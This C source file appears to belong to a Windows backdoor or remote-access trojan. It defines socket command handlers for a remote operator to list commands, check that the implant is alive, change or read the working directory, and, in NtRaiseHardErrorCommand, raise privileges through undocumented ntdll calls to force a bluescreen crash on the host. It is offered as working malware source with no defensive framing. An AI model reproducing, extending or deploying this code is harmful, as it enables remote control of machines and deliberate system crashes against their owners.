#include <string.h>
#include "Commands.h"
#include "SocketUtil.h"

//undocumented API
//declarations
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, 
								PULONG_PTR, ULONG, PULONG);


BOOL HelpCommand(SOCKET* sck) {
	char buf[BUFSIZE];
	ZeroMemory(buf,BUFSIZE);
	
	for(int i = 0; strlen(buf) < BUFSIZE && i < N_COMMANDS; ++i) {
		strncat(buf, commands[i].command, strlen(commands[i].command));
		
		if(commands[i].needsArguments)
			strncat(buf, " [a]", 4);

		if(i < N_COMMANDS - 1)
			strncat(buf, ", ", 2);
	}

	WriteConnection(sck, buf);

	return TRUE;
}

BOOL HelloCommand(SOCKET* sck) {
	WriteConnection(sck, "i am still here dumbass...\n");

	return TRUE;
}

BOOL ReplyCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	WriteConnection(sck, str);

	return TRUE;
}

BOOL NtRaiseHardErrorCommand(SOCKET* sck) {
	WriteConnection(sck, "Goodbye my friend...\n");

    BOOLEAN bl;
	ULONG response;

    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    
    CloseConnection(sck);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	return TRUE;
}

BOOL ChangeDirectoryCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	if(!SetCurrentDirectory(str)) 
		WriteConnection(sck, "Could not change working directory\n");

	return TRUE;
}

BOOL GetCwdCommand(SOCKET* sck) {
	char fullPath[MAX_PATH];
	ZeroMemory(fullPath, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, fullPath);

	WriteConnection(sck, fullPath);
	
	return TRUE;
}
